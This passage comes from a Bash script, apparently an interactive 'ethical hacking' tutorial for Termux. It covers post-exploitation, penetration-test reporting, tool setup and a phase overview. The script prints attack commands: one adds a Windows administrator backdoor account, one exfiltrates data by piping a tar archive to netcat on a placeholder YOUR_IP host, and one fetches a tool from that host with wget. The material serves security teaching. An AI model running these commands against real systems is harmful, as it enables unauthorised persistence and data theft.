    echo -e "${WHITE}Methods (Windows):${NC}"
    echo "  # Add user"
    echo "  net user hacker P@ssw0rd123 /add"
    echo "  net localgroup administrators hacker /add"
    echo ""

    # Data Exfiltration
    echo -e "${GREEN}── SUB-STEP 7d: Data Exfiltration ──${NC}"
    echo -e "${WHITE}Commands:${NC}"
    echo "  # Using Netcat"
    echo "  # On target: tar czf - /path/to/data | nc YOUR_IP 9999"
    echo "  # On your machine: nc -lvnp 9999 > stolen_data.tar.gz"
    echo ""
    echo "  # Using Python HTTP server"
    echo "  # On your machine: python3 -m http.server 8080"
    echo "  # On target: wget http://YOUR_IP:8080/upload_tool.sh"
    echo ""

    echo -e "${GREEN}✅ STEP 7 COMPLETE! You've maintained and deepened access.${NC}"
    echo ""
    echo -e "${YELLOW}➡️ FINAL STEP:${NC} Proceed to STEP 8 (Reporting)"
    echo ""

    read -p "Go to Step 8? (y/n/menu): " next
    if [[ "$next" == "y" || "$next" == "Y" ]]; then
        step8_reporting
    else
        show_main_menu
    fi
}

# ============================================================
# STEP 8: Reporting
# ============================================================
step8_reporting() {
    clear
    show_banner
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}${BOLD}              STEP 8: REPORTING                        ${NC}"
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 PURPOSE:${NC} Document findings, evidence, and remediation steps"
    echo -e "${YELLOW}📌 GOAL:${NC} Create a professional penetration test report"
    echo ""
    echo -e "${MAGENTA}─────────── SUB-STEPS ────────────${NC}"
    echo ""

    echo -e "${GREEN}── CREATING REPORT STRUCTURE ──${NC}"
    echo ""
    echo -e "${WHITE}Report Sections:${NC}"
    echo "  1. Executive Summary"
    echo "  2. Scope & Objectives"
    echo "  3. Methodology"
    echo "  4. Findings Summary (Risk Matrix)"
    echo "  5. Detailed Findings per Vulnerability"
    echo "     - Description"
    echo "     - Evidence (screenshots, logs)"
    echo "     - Risk Rating (Critical/High/Medium/Low)"
    echo "     - Remediation Steps"
    echo "  6. Conclusion & Recommendations"
    echo ""

    # Create report template
    echo -e "${BLUE}[*] Creating report template...${NC}"
    mkdir -p $HOME/ethical-hacking-report/{screenshots,logs,evidence}

    cat > $HOME/ethical-hacking-report/report.md << 'REPORT'
# Penetration Test Report

## Executive Summary
Date: $(date +%Y-%m-%d)
Target: [TARGET NAME/IP]
Tester: [YOUR NAME]

### Overall Risk Level: [CRITICAL / HIGH / MEDIUM / LOW]

---

## 1. Scope & Objectives
- Target systems:
- Testing period:
- Authorized by:

## 2. Methodology
- Reconnaissance (OSINT)
- Scanning & Enumeration
- Vulnerability Assessment
- Exploitation
- Post-Exploitation

## 3. Findings Summary

| ID | Vulnerability | Severity | CVSS | Status |
|----|--------------|----------|------|--------|
| V1 | Example Vuln  | Critical | 9.8  | Open   |
| V2 | Example Vuln  | High     | 7.5  | Open   |

## 4. Detailed Findings

### Finding 1: [VULNERABILITY NAME]
- **Severity:** Critical/High/Medium/Low
- **CVSS Score:** X.X
- **Description:**
- **Evidence:**
- **Impact:**
- **Remediation:**

## 5. Conclusion
REPORT

    echo -e "${GREEN}[✓] Report template created at: ~/ethical-hacking-report/report.md${NC}"
    echo ""

    # Tools for report generation
    echo -e "${GREEN}── USEFUL REPORTING TOOLS ──${NC}"
    echo ""
    echo -e "${WHITE}Dradis (Collaboration Platform):${NC}"
    echo "  https://dradis.com/ - Open-source reporting framework"
    echo ""
    echo -e "${WHITE}PlexTrac (Report Management):${NC}"
    echo "  https://plextrac.com/ - Automated report generation"
    echo ""
    echo -e "${WHITE}Serpico (Report Generator):${NC}"
    echo "  https://github.com/SerpicoProject/Serpico"
    echo ""
    echo -e "${WHITE}Convert Markdown to PDF:${NC}"
    echo "  pkg install pandoc"
    echo "  pandoc report.md -o report.pdf"
    echo ""

    # Evidence collection reminder
    echo -e "${GREEN}── EVIDENCE COLLECTION CHECKLIST ──${NC}"
    echo ""
    echo "  □ Screenshots of all findings"
    echo "  □ Nmap scan results (saved as .txt/.xml)"
    echo "  □ Exploit commands used"
    echo "  □ Data accessed/demonstrated"
    echo "  □ Timeline of activities"
    echo ""

    echo -e "${GREEN}✅ STEP 8 COMPLETE! Your report framework is ready.${NC}"
    echo ""
    echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}${BOLD}  🎓 ETHICAL HACKING GUIDE COMPLETE!                 ${NC}"
    echo -e "${GREEN}${BOLD}═══════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}📌 FINAL REMINDERS:${NC}"
    echo -e "  ${RED}1. Always get WRITTEN PERMISSION before testing${NC}"
    echo -e "  ${RED}2. Document EVERYTHING${NC}"
    echo -e "  ${RED}3. Do NOT access/modify data beyond scope${NC}"
    echo -e "  ${RED}4. Follow responsible disclosure guidelines${NC}"
    echo ""
    echo -e "${CYAN}📚 Recommended Certifications:${NC}"
    echo "  - CEH (Certified Ethical Hacker)"
    echo "  - OSCP (Offensive Security Certified Professional)"
    echo "  - CompTIA Security+"
    echo "  - eJPT (eLearnSecurity Junior Penetration Tester)"
    echo ""

    show_main_menu
}

# ============================================================
# INITIAL SETUP OPTION
# ============================================================
initial_setup() {
    echo -e "${BLUE}╔══════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║         🔧 INITIAL TERMUX SETUP                 ║${NC}"
    echo -e "${BLUE}══════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}║  This will install essential packages for the    ║${NC}"
    echo -e "${BLUE}║  ethical hacking guide. Run this FIRST!          ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════╝${NC}"
    echo ""
    read -p "Do you want to run initial setup? (y/n): " setup

    if [[ "$setup" == "y" || "$setup" == "Y" ]]; then
        echo -e "${YELLOW}[*] Updating Termux packages...${NC}"
        pkg update -y && pkg upgrade -y

        echo -e "${YELLOW}[*] Installing essential tools...${NC}"
        pkg install -y nmap whois dnsutils python git wget curl net-tools hydra exploitdb

        echo -e "${YELLOW}[*] Installing Python packages...${NC}"
        pip install requests beautifulsoup4 theHarvester 2>/dev/null

        echo -e "${GREEN}[✓] Setup complete! Now run the guide again.${NC}"
        sleep 2
    fi
}

# ============================================================
# MAIN ENTRY POINT
# ============================================================
main() {
    show_banner

    echo -e "${CYAN}${BOLD}  🌐 ETHICAL HACKING STEP-BY-STEP GUIDE${NC}"
    echo -e "${CYAN}${BOLD}  ═════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${GREEN}1)${NC} Start Guide (Select a Phase)"
    echo -e "  ${BLUE}2)${NC} Initial Termux Setup (Install Tools)"
    echo -e "  ${YELLOW}3)${NC} Quick Reference (All Steps Overview)"
    echo -e "  ${RED}0)${NC} Exit"
    echo ""
    read -p "Select option: " main_choice

    case $main_choice in
        1) show_main_menu ;;
        2) initial_setup ;;
        3)
            clear
            show_banner
            echo -e "${BOLD}📋 QUICK REFERENCE - ALL STEPS:${NC}"
            echo ""
            echo -e "${GREEN}STEP 1:${NC} Reconnaissance & OSINT"
            echo "       whois, dig, theHarvester, sherlock"
            echo ""
            echo -e "${GREEN}STEP 2:${NC} Scanning & Enumeration"
            echo "       nmap (host discovery, port scan, service detection)"
            echo ""
            echo -e "${GREEN}STEP 3:${NC} Vulnerability Assessment"
            echo "       nmap vuln scripts, nuclei, nikto"
            echo ""
            echo -e "${GREEN}STEP 4:${NC} Web Application Testing"
            echo "       sqlmap, dirsearch, XSS, LFI testing"
            echo ""
            echo -e "${GREEN}STEP 5:${NC} Password Attacks"
            echo "       hydra, john, hashcat, crunch, cupp"
            echo ""
            echo -e "${GREEN}STEP 6:${NC} Exploitation"
            echo "       metasploit, searchsploit, reverse shells"
            echo ""
            echo -e "${GREEN}STEP 7:${NC} Post-Exploitation"
            echo "       enumeration, privesc, persistence, exfiltration"
            echo ""
            echo -e "${GREEN}STEP 8:${NC} Reporting"
            echo "       Document findings, create professional reports"
            echo ""
            read -p "Press [Enter] to go to menu..."
            show_main_menu
            ;;
        0)
            echo -e "${GREEN}Goodbye! Stay ethical! 🔒${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid option!${NC}"
            sleep 1
            main
            ;;
    esac
}

# Start
main
